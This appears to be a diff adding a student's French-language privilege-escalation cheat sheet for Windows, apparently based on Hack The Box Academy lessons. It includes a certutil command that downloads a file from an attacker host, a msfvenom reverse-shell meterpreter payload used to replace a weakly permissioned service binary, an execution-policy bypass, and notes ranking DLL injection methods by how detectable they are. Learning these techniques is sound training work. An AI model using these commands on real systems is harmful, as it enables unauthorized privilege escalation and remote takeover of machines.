@@ -1,0 +1,43 @@
+##Attacking the OS
+
+#UAC Bypass 
+https://academy.hackthebox.com/module/67/section/626 --> Duh
+
+#Weak Permissions 
+Check Weak ACL services
+	--> SharpUp.exe audit 
+Utiliser icacls pour verifier la vulnérabilité (exemple avec SecurityService.exe)
+	--> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+	--> Le service peut être lancé par tous le monde
+Remplacer l'executable par un payload msfvenom du même nom 
+	==Utiliser Certutil pour l'upload==
+	== certutil -urlcache -f "http://IP:Port/Fichier" <outputfile_name> == 	
+	--> msfvenom -p windows/meterpreter/reversetcp LHOST= LPORT= -f exe > nomservice.exe
+	--> msfconsole exploit/multi/handler
+https://academy.hackthebox.com/module/67/section/628
+
+#Kernel Exploits
+--> https://msrc.microsoft.com/update-guide/vulnerability
+https://academy.hackthebox.com/module/67/section/627
+
+Suivre les exploits connus des kernels.. 
+
+#Services Vulnérables
+Enumération
+	wmic product get name 
+	-->Rechercher Vulns connues
+
+Utiles pour énumérer les services potentiellement vulnérables
+	-> netstat -ano | findstr <PORT vuln>
+	-> get-process -Id <IDPROCESS>
+	-> get-service | ? {$_.DisplayName -like 'Nomservice*'}
+
+!!! Set-ExecutionPolicy Bypass -Scope Process !!!
+
+#DLL Injection
+https://academy.hackthebox.com/module/67/section/2501
+
+LoadLibrary --> detection simple
+Manual mapping --> complexe mais peu detectable 
+Reflective DLL Injection --> https://github.com/stephenfewer/ReflectiveDLLInjection
+DLL Hijacking --> Via Proxying ou invalid libraries
